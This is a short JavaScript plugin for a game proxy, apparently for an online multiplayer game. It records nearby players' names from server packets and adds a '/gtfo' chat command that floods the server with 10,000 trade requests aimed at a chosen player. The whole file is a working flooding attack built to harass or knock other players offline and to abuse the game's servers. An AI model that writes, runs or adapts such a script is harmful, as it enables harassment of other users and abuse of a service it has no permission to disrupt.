// gtfo.js

var ID_PLAYER_TEXT = $.findPacketId("PLAYERTEXT");
var ID_UPDATE = $.findPacketId("UPDATE");
var ID_REQUEST_TRADE = $.findPacketId("REQUESTTRADE");

var players = {};

function onClientPacket(event) {
	var packet = event.getPacket();
	switch (packet.id()) {
		case ID_PLAYER_TEXT: {
			var text = packet.text.toLowerCase();
			if(text.length() >= 6 && text.substring(0,5) == "/gtfo"){
				event.cancel();

				if(text.length() <= 7){
					break;
				}
				var toBreak = text.substring(6, text.length());

				for(var player in players){
					var name = players[player].toLowerCase();
					if(name.length() < toBreak.length())
						continue;
					if (toBreak == name.substring(0,toBreak.length())){
						var trade_packet = event.createPacket(ID_REQUEST_TRADE);
						trade_packet.name = name;
						for(var i = 0; i < 10000; i++){
							event.sendToServer(trade_packet);
						}
						break;
					}
				}
			}
			break;
		}
	}
}

function onServerPacket(event) {
	var packet = event.getPacket();
	switch (packet.id()) {
		case ID_UPDATE: {
			// New objects
			for (var i = 0; i < packet.newObjs.length; i++) {
				var objectData = packet.newObjs[i];

				var type = objectData.objectType;
				if(type == 768 || type == 775 || type == 782 || type == 784 || (type >= 797 && type <= 806)){ // player classes
					for (var j = 0; j < objectData.status.data.length; j++) {
						var statData = objectData.status.data[j];

						if(statData != null && statData.obf0 == 31){
							players[objectData.status.objectId] = statData.obf2;
							break;
						}
					}
				}
			}

			// Removed objects
			for (var i = 0; i < packet.drops.length; i++) {
				var droppedObjectId = packet.drops[i];

				if(players[droppedObjectId] != null){
					delete players[droppedObjectId];			
				}
			}
			break;
		}
	}
}